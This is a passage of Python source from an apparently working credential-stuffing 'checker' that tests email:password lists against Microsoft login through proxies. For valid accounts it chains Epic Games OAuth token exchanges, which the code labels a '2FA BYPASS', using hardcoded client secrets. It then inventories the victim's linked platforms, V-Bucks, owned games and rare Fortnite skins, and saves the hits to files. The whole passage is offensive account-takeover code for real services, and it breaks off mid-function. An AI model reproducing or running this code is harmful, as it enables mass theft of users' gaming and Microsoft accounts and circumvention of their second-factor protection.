                            r = response
                            failure_keywords = [
                                "Your account or password is incorrect.",
                                "That Microsoft account doesn\\'t exist. Enter a different account",
                                "Sign in to your Microsoft account",
                                'const trackingBase="https://tracking.epicgames.com,https://tracking.unrealengine.com"',
                                'Please sign in with a Microsoft account or create a new account',
                            ]

                            ban_keywords = [
                                                ",AC:null,urlFedConvertRename",
                                            ]


                            two_factor_keywords = [
                                                "account.live.com/recover?mkt",
                                                "recover?mkt",
                                                "account.live.com/identity/confirm?mkt",
                                                "Email/Confirm?mkt",
                                                "Help us protect your account",
                                            ]

                            custom_keywords = [
                                                "/cancel?mkt=",
                                                "/Abuse?mkt=",
                                            ]
                            cookies = r.cookies.get_dict()
                            result = 'Unknown'
                            if any(keyword in r.text.strip() for keyword in failure_keywords):
                                result = 'Failure'
                            elif any(keyword in r.text.strip() for keyword in ban_keywords):
                                result = 'Ban'
                            elif any(keyword in r.text.strip() for keyword in two_factor_keywords):
                                result = '2FACTOR'
                            elif any(keyword in r.text.strip() for keyword in custom_keywords):
                                result = "CUSTOM"
                            elif any(keyword in cookies for keyword in ["ANON", "WLSSC"]) or \
                            any(keyword in r.url for keyword in ["https://login.live.com/oauth20_desktop.srf?"]) or \
                            "sSigninName" in r.text.strip():
                                result = "Success"

                            if result == 'Failure' or result == '2FACTOR' or result == 'Ban' or result == 'CUSTOM' or result == 'Unknown':
                                checked_num+=1
                                Counter.retries+=1    
                                continue
                            else:
                                url = self.parse_source_for_url(response.text)
                                if url:
                                    try:
                                        rr = self.parse_url(url)  
                                        o_params = self.parse_cookie(session.cookies, "OParams")
                                        msa = self.parse_cookie(session.cookies, "__Host-MSAAUTH")
                                        url2 = f'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216&opid=F7304AA192830107&route={rr}'
                                        headers = {
                                            "Accept-Encoding": "gzip, deflate, br",
                                            "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
                                            "Cache-Control": "max-age=0",
                                            "Connection": "keep-alive",
                                            "Content-Length": "267",
                                            "Content-Type": "application/x-www-form-urlencoded",
                                            "Cookie": f"MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; wlidperf=FR=L&ST=1701944522902; __Host-MSAAUTH={msa}; PPLState=1; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36a$uuid-dd8bae77-7811-4d1e-82dc-011f340afefe; OParams={o_params}",
                                            "Host": "login.live.com",
                                            "Origin": "https://login.live.com",
                                            "Referer": "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216",
                                            "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                                            "sec-ch-ua-mobile": "?0",
                                            "sec-ch-ua-platform": "\"Windows\"",
                                            "Sec-Fetch-Dest": "document",
                                            "Sec-Fetch-Mode": "navigate",
                                            "Sec-Fetch-Site": "same-origin",
                                            "Sec-Fetch-User": "?1",
                                            "Upgrade-Insecure-Requests": "1",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
                                        }
                                        retr = 0
                                        while True:
                                            try:
                                                response = session.post(url2, headers=headers, data=payload, proxies=self.proxies(), timeout=Checker.timeout)
                                                if 'id/oauth-authorized?code=' in response.url:
                                                    if Counter.brute:
                                                        if line in Counter.remaining:
                                                            Counter.remaining.remove(line)
                                                        Counter.hits+=1
                                                        if 'n' == self.cuimode:
                                                            if Checker.printms:
                                                                self.prints(f'{Fore.YELLOW}[HIT] - {self.blur(line)}')
                                                        if not os.path.exists(self.folder + '/Fortnite'):
                                                            os.makedirs(self.folder + '/Fortnite')
                                                        open(f'{self.folder}/Fortnite/Hits.txt', 'a',
                                                        encoding='u8').write(f'{line}\n')
                                                        return
                                                    else:
                                                        break
                                                else:
                                                    if retr >= Checker.retries:
                                                        if line in Counter.remaining:
                                                            Counter.remaining.remove(line)
                                                        Counter.mshit+=1
                                                        if 'n' == self.cuimode:
                                                            if Checker.printms:
                                                                self.prints(f'{Fore.YELLOW}[MS-HIT] - {self.blur(line)}')
                                                        if not os.path.exists(self.folder + '/Microsoft'):
                                                            os.makedirs(self.folder + '/Microsoft')
                                                        open(f'{self.folder}/Microsoft/Hits.txt', 'a',
                                                        encoding='u8').write(f'{line}\n')
                                                        open(f'{self.folder}/Microsoft/All.txt', 'a',
                                                        encoding='u8').write(f'{line}\n')
                                                        return
                                                    else:
                                                        retr+=1
                                                        Counter.retries+=1
                                                        continue 
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue

                                        parsed_url = urllib.parse.urlparse(response.url)
                                        query_params = urllib.parse.parse_qs(parsed_url.query)
                                        code = query_params.get('code', [None])[0]
                                        login_url = "https://login.live.com/oauth20_authorize.srf"
                                        login_payload = {
                                            'login': email,
                                            'loginfmt': email,
                                            'passwd': password,
                                            'type': '11',
                                            'LoginOptions': '3'
                                        }
                                        # Step 1: Initiate login

                                        paramsss = {
                                            'client_id': '82023151-c27d-4fb5-8551-10c10724a55e',
                                            'redirect_uri': 'https://accounts.epicgames.com/OAuthAuthorized',
                                            'scope': 'xboxlive.signin',
                                            'response_type': 'code',
                                            'display': 'popup'
                                        }
                                        # Step 4: Submit login
                                        responsess = session.post(login_url, data=login_payload, params=paramsss)    
                                        parsed_url2 = urllib.parse.urlparse(responsess.url)
                                        query_params2 = urllib.parse.parse_qs(parsed_url2.query)
                                        code2 = query_params2['code'][0]    
                                        
                                        url = "https://www.epicgames.com/id/api/reputation"
                                        headers = {
                                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
                                            "Accept-Encoding": "gzip, deflate, br, zstd",
                                            "Accept-Language": "en-GB,en;q=0.5",
                                            "Connection": "keep-alive",
                                            "DNT": "1",
                                            "Host": "www.epicgames.com",
                                            "Priority": "u=0, i",
                                            "Sec-Fetch-Dest": "document",
                                            "Sec-Fetch-Mode": "navigate",
                                            "Sec-Fetch-Site": "none",
                                            "Sec-Fetch-User": "?1",
                                            "Sec-GPC": "1",
                                            "Upgrade-Insecure-Requests": "1",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
                                        }
                                        while True:
                                            try:                    
                                                response = scraper.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                cookies = response.cookies.get_dict()
                                                cookies.get('EPIC_SESSION_REPUTATION')
                                                cookies.get('EPIC_SESSION_AP')
                                                xsrf_token_cookie = cookies.get('XSRF-TOKEN')
                                                
                                                break
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue
                                        url = "https://www.epicgames.com/id/api/external/xbl/login"
                                        payload = {
                                            "code": f'{code}'
                                        }
                                        headers = {
                                            "POST": "/id/api/external/xbl/login HTTP/1.1",
                                            "Host": "www.epicgames.com",
                                            "Connection": "keep-alive",
                                            "X-Epic-Event-Category": "null",
                                            "X-XSRF-TOKEN": xsrf_token_cookie,
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 OPR/74.0.3911.107 (Edition utorrent)",
                                            "X-Epic-Event-Action": "null",
                                            "Content-Type": "application/json;charset=UTF-8",
                                            "Accept": "application/json, text/plain, */*",
                                            "X-Requested-With": "XMLHttpRequest",
                                            "X-Epic-Strategy-Flags": "guardianEmailVerifyEnabled=false;guardianKwsFlowEnabled=false;minorPreRegisterEnabled=false",
                                            "Origin": "https://www.epicgames.com",
                                            "Sec-Fetch-Site": "same-origin",
                                            "Sec-Fetch-Mode": "cors",
                                            "Sec-Fetch-Dest": "empty",
                                            "Referer": "https://www.epicgames.com/id/login/xbl?prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiJmN2MxODNkMzczYmQ0NzMxYTMxYjVjN2NlMGViNzE1ZSIsImlzV2ViIjp0cnVlLCJpcCI6IjE5Ny4yNi4xMzguMjE2IiwiaWQiOiIwMjEwYTIyNTcyMjU0ZDYzOTg1ZGFjOGU4NmM4MGVlZSIsImNvZGUiOiJNLlIzX0JBWS5mYzRjZGZjNi1iMTQ5LTNhN2YtYzZmNC1jZWMzY2Y3MDZmMDkifQ%253D%253D",
                                            "Accept-Language": "en-US,us;q=0.9",
                                            "Accept-Encoding": "gzip, deflate",
                                            "Content-Length": "56"  
                                        }

                                        while True:
                                            try:
                                                response = scraper.post(url, json=payload, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                tfa = False
                                                headles = False                                                
                                                if 'message":"Two-Factor authentication' in response.text :
                                                    if line in Counter.remaining:
                                                            Counter.remaining.remove(line)
                                                    Counter.mshit+=1
                                                    Counter.epic2fa+=1
                                                    tfa = True
                                                    break
                                                elif 'errorCode":"errors.com.epicgames.accountportal.account_headless' in response.text:
                                                    Counter.hits+=1
                                                    Counter.headless+=1
                                                    headles = True
                                                    if line in Counter.remaining:
                                                            Counter.remaining.remove(line)
                                                    break
                                                        
                                                elif 'DATE_OF_BIRTH' in response.text or 'message":"No account was found to log you in' in response.text:
                                                    Counter.mshit+=1
                                                    Counter.xb +=1
                                                    if line in Counter.remaining:
                                                            Counter.remaining.remove(line)
                                                    if 'n' == self.cuimode:
                                                        if Checker.printms:
                                                            self.prints(f'{Fore.YELLOW}[MS-HIT][XBOX] - {self.blur(line)}')
                                                    if not os.path.exists(self.folder + '/Microsoft'):
                                                        os.makedirs(self.folder + '/Microsoft')
                                                    open(f'{self.folder}/Microsoft/Xbox.txt', 'a',
                                                    encoding='u8').write(f'{line}\n')
                                                    open(f'{self.folder}/Microsoft/All.txt', 'a',
                                                    encoding='u8').write(f'{line}\n')
                                                    return                                      
                                                elif 'code is required' in response.text:
                                                    Counter.retries+=1
                                                    continue
                                                else:
                                                    break
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue


                                        ##2FA BYPASS
                                        exchange_url = 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token'
                                        headers = {
                                            'Content-Type': 'application/x-www-form-urlencoded',
                                            'Authorization': 'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE='
                                        }
                                        data = {
                                            'grant_type': 'external_auth',
                                            'external_auth_type': 'xbl',
                                            'external_auth_token': code2
                                        }
                                        
                                        response = requests.post(exchange_url, headers=headers, data=data)
                                        if response.status_code == 200:
                                            access_token = response.json().get('access_token')
                                        else:
                                            Counter.retries+=1
                                            continue
                                                
                                        
                                        exchange_url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange'
                                        headers = {
                                            'Authorization': f'Bearer {access_token}'
                                        }
                                        response = requests.get(exchange_url, headers=headers)

                                        if response.status_code == 200:
                                            ex = response.json().get('code')
                                        else:
                                            Counter.retries+=1
                                            continue  
                                        
                                        url = "https://account-public-service-prod.ak.epicgames.com/account/api/oauth/token"
                                        payload = {
                                            "grant_type": "exchange_code",
                                            "exchange_code": ex,
                                            "token_type": "eg1"
                                        }
                                        headers = {
                                            "Host": "account-public-service-prod.ak.epicgames.com",
                                            "Accept": "*/*",
                                            "X-Epic-Correlation-ID": "UE4-0cb999094c593037703e67a2364dad7a-63523E0D4DA6FA14E96DC9A5AC137A03-3E1FA7274351413FF9E430829D1920FC",
                                            "User-Agent": "UELauncher/16.7.0-34134031+++Portal+Release-Live Windows/10.0.19045.1.256.64bit",
                                            "Content-Type": "application/x-www-form-urlencoded",
                                            "Authorization": "basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y=",  # Replace this with the actual encoded credentials if necessary
                                            "Accept-Encoding": "gzip, deflate"
                                        }
                                        while True:
                                            try:
                                                response = scraper.post(url, data=payload, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                parsed_json = response.json()
                                                AT1 = parsed_json.get("access_token")
                                                ACCID = parsed_json.get("account_id")
                                                break
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue  
                                        headers = {
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                            "Pragma": "no-cache",
                                            "Accept": "*/*",
                                            "Authorization": f"bearer {AT1}"
                                        }       
                                        url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
                                        while True:
                                            try:
                                                response = scraper.get(url, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                if '"code":"' in response.text:
                                                    start = response.text.find("\"code\":\"") + len("\"code\":\"")
                                                    end = response.text.find("\"", start)
                                                    CODE22 = response.text[start:end]
                                                    break
                                                else:
                                                    Counter.retries+=1
                                                    continue 
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue  
                                        headers = {
                                            "Content-Type": "application/x-www-form-urlencoded",
                                            "Authorization": "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
                                        }
                                        payload = {
                                            "grant_type": "exchange_code",
                                            "exchange_code": CODE22
                                        }
                                        url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
                                        while True:
                                            try:
                                                response = scraper.post(url, headers=headers, data=payload, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                if "refresh_token" in response.json():
                                                    RT = response.json().get("refresh_token")  
                                                    break
                                                else:
                                                    Counter.retries+=1
                                                    continue 
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue 
                                        headers = {
                                            "Content-Type": "application/x-www-form-urlencoded",
                                            "Authorization": "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
                                        }
                                        payload = {
                                            "grant_type": "refresh_token",
                                            "refresh_token": RT
                                        }
                                        while True:
                                            try:
                                                response = scraper.post(url, headers=headers, data=payload, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                if "access_token" in response.json():
                                                    AT = response.json().get("access_token")
                                                    break
                                                else:
                                                    Counter.retries+=1
                                                    continue 
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue 
                                        headers = {
                                            "User-Agent": "UELauncher/11.0.2-14967703+++Portal+Release-Live Windows/10.0.19041.1.256.64bit",
                                            "Authorization": f"bearer {AT1}"
                                        }
                                        linked = []
                                        try:
                                            url = f'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{ACCID}/externalAuths'
                                            while True:
                                                try:
                                                    response = scraper.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                    if response.status_code == 200:
                                                        break
                                                    else:
                                                        Counter.retries+=1
                                                        continue 
                                                except Exception as e:
                                                    Counter.retries+=1
                                                    continue 
                                            platforms = {
                                                '"type":"xbl"': 'Xbox',
                                                '"type":"psn"': 'Playstation',
                                                '"type":"steam"': 'Steam',
                                                '"type":"twitch"': 'Twitch',
                                                '"type":"lego"': 'Lego',
                                                '"type":"nintendo"': 'Nintendo',
                                                '"type":"github"': 'Github'
                                            }
                                            for platform_type, platform_name in platforms.items():
                                                if platform_type in response.text:
                                                    linked.append(platform_name)
                                            url = f'https://egs-platform-service.store.epicgames.com/api/v1/private/egs/account/wallet?locale=en&store=EGS'
                                            while True:
                                                try:
                                                    response = scraper.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                    break
                                                except:
                                                    Counter.retries+=1
                                                    continue
                                            balance = response.json().get("epicRewards", {}).get("balance", None)
                                            
                                            
                                            url = "https://library-service.live.use1a.on.epicgames.com/library/api/public/items"

                                            headers = {
                                                "Authorization": f"Bearer {AT1}"
                                            }
                                            GamesOwned = set()
                                            BLACKLIST = {"fortnite", "UE Marketplace", "Live", "huddle Production", "pennsylvania Production", "UT Marketplace",
                                                         "Twinmotion"}  # Add more games as needed
                                            BLACKLISTLow = {item.lower() for item in BLACKLIST}
                                            while True:
                                                try:
                                                    response = requests.get(url, headers=headers, timeout=Checker.timeout)
                                                    if response.status_code == 200:
                                                        data = response.json()
                                                        break
                                                    else:
                                                        Counter.retries += 1
                                                        continue
                                                except Exception as e:
                                                    Counter.retries += 1
                                                    continue

                                            data = response.json()
                                            records = data.get("records", [])
                                            for record in records:
                                                if record.get("recordType") == "APPLICATION":
                                                    app_name = record.get("sandboxName")
                                                    if app_name:
                                                        app_name_lower = app_name.lower()  # Convert to lowercase
                                                        if app_name_lower not in BLACKLISTLow:
                                                            GamesOwned.add(app_name)

                                            GamesOwn = list(GamesOwned)
                                            totalgame = len(GamesOwn)

                                            url = f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{ACCID}"
                                            while True:
                                                try:
                                                    response = scraper.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                    if response.status_code == 200:
                                                        data = response.json()  
                                                        break
                                                    else:
                                                        Counter.retries+=1
                                                        continue 
                                                except Exception as e:
                                                    Counter.retries+=1
                                                    continue 
                                            display_name = data.get("displayName", "Not Available")
                                            country = data.get("country", "Not Available")
                                            tfa_enabled = data.get("tfaEnabled", "Not Available")
                                            epicEmail = data.get("email", "Not Available")
                                            email_verified_status = data.get("emailVerified", "Unknown")
                                            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/public/QueryPublicProfile?profileId=campaign"
                                            headers = {
                                                "Authorization": f"Bearer {AT}",
                                                "Content-Type": "application/json"
                                            }
                                            while True:
                                                try:
                                                    response = scraper.post(url, headers=headers, json={}, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                    data = response.json()  
                                                    break
                                                except Exception as e:
                                                    Counter.retries+=1
                                                    continue  
                                            try:
                                                if "tutorial" in str(data):
                                                    has_stw = "YES"
                                                else:
                                                    has_stw = "NO"
                                            except:
                                                has_stw = 'ERROR'
                                            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/client/QueryProfile?profileId=athena&rvn=-1"
                                            headers = {
                                                "User-Agent": "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit",
                                                "Authorization": f"Bearer {AT}",
                                                "Content-Type": "application/json"
                                            }
                                            while True:
                                                try:
                                                    response = scraper.post(url, headers=headers, json={}, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                    response_str = response.text
                                                    break
                                                except Exception as e:
                                                    Counter.retries+=1
                                                    continue  
                                            if "Login is banned or does not posses the action 'PLAY'" in response_str or "numericErrorCode\" : 1023," in response_str or "messageVars\" : [ \"PLAY" in response_str or response.status_code == 403:
                                                if line in Counter.remaining:
                                                            Counter.remaining.remove(line)
                                                Counter.fnban+=1
                                                if 'n' == self.cuimode:
                                                    self.prints(f'{Fore.YELLOW}[FN-BAN] - {self.blur(line)}')
                                                if not os.path.exists(self.folder + '/Fortnite'):
                                                    os.makedirs(self.folder + '/Fortnite')
                                                open(f'{self.folder}/Fortnite/Banned.txt', 'a',
                                                encoding='u8').write(f'{line}\n')
                                                return
                                            Counter.hits+=1
                                            if has_stw == 'YES':
                                                Counter.stw+=1
                                            try:
                                                if line in Counter.remaining:
                                                    Counter.remaining.remove(line)
                                            except:
                                                pass
                                            level_pattern = re.compile(r'"accountLevel"\s*:\s*(\d+)')
                                            total_wins_pattern = re.compile(r'"lifetime_wins"\s*:\s*(\d+)')
                                            level_match = level_pattern.search(response_str)
                                            level = level_match.group(1) if level_match else 'N/A'
                                            total_wins_match = total_wins_pattern.search(response_str)
                                            total_wins = total_wins_match.group(1) if total_wins_match else 'N/A'
                                            data = response.json()
                                                
                                            past_seasons = data.get('profileChanges', [])[0].get('profile', {}).get('stats', {}).get('attributes', {}).get('past_seasons', [])
                                            try:
                                                last_login = data.get('profileChanges', [])[0].get('profile', {}).get('stats', {}).get('attributes', {}).get('last_match_end_datetime', 'N/A')
                                            except:
                                                last_login = 'N/A'
                                            first_active_season = None
                                            for season in past_seasons:
                                                try:
                                                    if season['seasonXp'] > 0:
                                                        if first_active_season is None or season['seasonNumber'] < first_active_season['seasonNumber']:
                                                            first_active_season = season
                                                except:
                                                    continue
                                            if first_active_season:
                                                first_active_season = first_active_season['seasonNumber']
                                            else:
                                                first_active_season = 'N/A'
                                            skins = []
                                            exclusive = False
                                            exclusiveSkin = []
                                            localSkins = []
                                            try:
                                                with open('skins_database.txt', 'r') as file:
                                                    localSkins = file.readlines()
                                            except:
                                                localSkins = []
                                            def search_skins(obj):
                                                if isinstance(obj, dict):
                                                    for key, value in obj.items():
                                                        if key == "templateId" and value.startswith("AthenaCharacter:"):
                                                            found = False
                                                            skin_id = value.split("AthenaCharacter:")[1]
                                                            for linee in localSkins:
                                                                if linee.split(':')[0].lower() == skin_id.lower():
                                                                    found = True
                                                                    skinName = linee.split(':')[1]
                                                            if not found:
                                                                while True:
                                                                    try:
                                                                        url = f'https://fortnite-api.com/v2/cosmetics/br/{skin_id}'
                                                                        r = requests.get(url, timeout=Checker.timeout).json()
                                                                        if r['status'] == 200:
                                                                            skinName = r['data']['name']
                                                                            with open('skins_database.txt', 'a') as file:
                                                                                file.write(f'{skin_id}:{skinName}' + '\n')
                                                                            break
                                                                        else:
                                                                            Counter.retries+=1
                                                                            continue
                                                                    except Exception as e:
                                                                        Counter.retries +=1
                                                                        continue
                                                            wtf = ['Cursed Jack Sparrow', 'Robert Trujillo', 'Kirk Hammett', 'James Hetfield', 'The Weeknd']
                                                            if skinName not in wtf:
                                                                skins.append(skinName)
                                                        else:
                                                            search_skins(value)
                                                elif isinstance(obj, list):
                                                    for item in obj:
                                                        search_skins(item)
                                            search_skins(data)
                                            unique_skins = set(skins)
                                            total_skins = len(unique_skins)
                                            processed_skins = [skin.replace("character_speeddial", "").strip() for skin in unique_skins]
                                            exclusiveSkins = [
                                                'glow', 'eon', 'dark skully', 'rogue spider knight', "fixer", "trilogy",
                                                'carbon commando', 'fishstick', 'psycho bandit', "renegade shadow",
                                                'black knight', 'skull trooper', 'ghoul trooper',
                                                'omega','blitz', 'havoc', 'john wick', 'blue striker',
                                                'prodigy', 'galaxy', 'blue team leader', 'royal knight',
                                                'stealth reflex', 'sub commander','chun-li', 'huntmaster saber','the reaper', 'blue squire', 
                                                'royale knight', 'sparkle specialist', 'brutus', 
                                                'midas', 'world cup', 'rogue agent', 'elite agent', 'trailblazer', 
                                                'strong guard', 'rose team leader', 'warpaint', 'travis', 
                                                'eddie brock', 'master chief', 'fresh', 'aerial assault trooper', 'ikonik', 'reflex', 'special forces', 'subzero cryptic',
                                                'wildcat', 'neo versa', 'major glory', 'point patroller', 'astro jack', 'travis scott', 'renegade raider', 'world warrior', 'chun-li',
                                                'lina scorch', 'wonder', 'guile', 'ryu', 'cammy', 'the champion', 'fncs champion seeker'
                                            ]

                                            for skin in processed_skins:
                                                if skin.lower() in exclusiveSkins:
                                                   exclusive = True
                                                   exclusiveSkin.append(skin)
                                            dances = []
                                            gliders = []
                                            pickaxes = []
                                            backpacks = []
                                            def search_items(obj):
                                                if isinstance(obj, dict):
                                                    for key, value in obj.items():
                                                        if key == "templateId":
                                                            if value.startswith("AthenaDance:eid_"):
                                                                dances.append(value)
                                                            elif value.startswith("AthenaGlider:"):
                                                                gliders.append(value)
                                                            elif value.startswith("AthenaPickaxe:"):
                                                                pickaxes.append(value)
                                                            elif value.startswith("AthenaBackpack:"):
                                                                backpacks.append(value)
                                                        else:
                                                            search_items(value)
                                                elif isinstance(obj, list):
                                                    for item in obj:
                                                        search_items(item)
                                            search_items(data)
                                            total_dances = len(dances)
                                            total_gliders = len(gliders)
                                            total_pickaxes = len(pickaxes)
                                            total_backpacks_bid = sum(1 for item in backpacks if "bid_" in item)
                                            total_backpacks_backpack = sum(1 for item in backpacks if "backpack_" in item)
                                            total_backpacks = total_backpacks_bid + total_backpacks_backpack
                                            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/client/QueryProfile?profileId=common_core&rvn=-1"
                                            headers = {
                                                "User-Agent": "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit",
                                                "Authorization": f"bearer {AT}",
                                                "Content-Type": "application/json"
                                            }
                                            content = "{}"
                                            while True:
                                                try:
                                                    response = scraper.post(url, headers=headers, data=content, cookies=response.cookies, timeout=Checker.timeout, proxies=self.proxies())
                                                    if response.status_code == 200:
                                                        data = response.json()
                                                        break
                                                    else:
                                                        Counter.retries+=1
                                                        continue
                                                except Exception as e:
                                                    Counter.retries+=1
                                                    continue
                                            try:
                                                def extract_quantity():
                                                    quantity = 0
                                                    items = data['profileChanges'][0]['profile']['items']
                                                    for item_id, item in items.items():
                                                        if 'Currency:Mtx' in item['templateId']:
                                                            quantity += item.get('quantity', 0)
                                                    return quantity
                                                Total_VBucks = extract_quantity()
                                            except:
                                                Total_VBucks = 'Error'
                                            if 'n' == self.cuimode:
                                                
                                                if tfa == True:
                                                    self.prints(
                                                    f'{Fore.GREEN}[HIT]' +
                                                    ('[2FA][FA]' if epicEmail.lower() == email.lower() else '[2FA][NFA]') +
                                                    (f'[S:{total_skins}]' if int(total_skins) > 0 else '') +
                                                    (f'[V:{Total_VBucks}]' if Total_VBucks > 0 else '') +
                                                    (f'[P:{total_pickaxes}]' if int(total_pickaxes) > 0 else '') +
                                                    (f'[B:{total_backpacks}]' if int(total_backpacks) > 0 else '') + 
                                                    f' - {self.blur(line)}' + 
                                                    (f' | Owned Games: {GamesOwn} | Total : {totalgame}' if int(totalgame) > 0 else '') 
                                                    )
                                                elif headles == True:
                                                    self.prints(
                                                    f'{Fore.GREEN}[HIT]' +
                                                    ('[HEADLESS][FA]') +
                                                    (f'[S:{total_skins}]' if int(total_skins) > 0 else '') +
                                                    (f'[V:{Total_VBucks}]' if Total_VBucks > 0 else '') +
                                                    (f'[P:{total_pickaxes}]' if int(total_pickaxes) > 0 else '') +
                                                    (f'[B:{total_backpacks}]' if int(total_backpacks) > 0 else '') + 
                                                    f' - {self.blur(line)}' + 
                                                    (f' | Owned Games: {GamesOwn} | Total : {totalgame}' if int(totalgame) > 0 else '') 
                                                    )
                                                else:
                                                    self.prints(
                                                    f'{Fore.GREEN}[HIT]' +
                                                    ('[FA]' if epicEmail.lower() == email.lower() else '[NFA]') +
                                                    (f'[S:{total_skins}]' if int(total_skins) > 0 else '') +
                                                    (f'[V:{Total_VBucks}]' if Total_VBucks > 0 else '') +
                                                    (f'[P:{total_pickaxes}]' if int(total_pickaxes) > 0 else '') +
                                                    (f'[B:{total_backpacks}]' if int(total_backpacks) > 0 else '') + 
                                                    f' - {self.blur(line)}' + 
                                                    (f' | Owned Games: {GamesOwn} | Total : {totalgame}' if int(totalgame) > 0 else '') 
                                                    )
                                            try:
                                                if int(first_active_season) <= 4:
                                                    Counter.og +=1
                                            except:
                                                pass
                                            fullAccess = 'NFA'
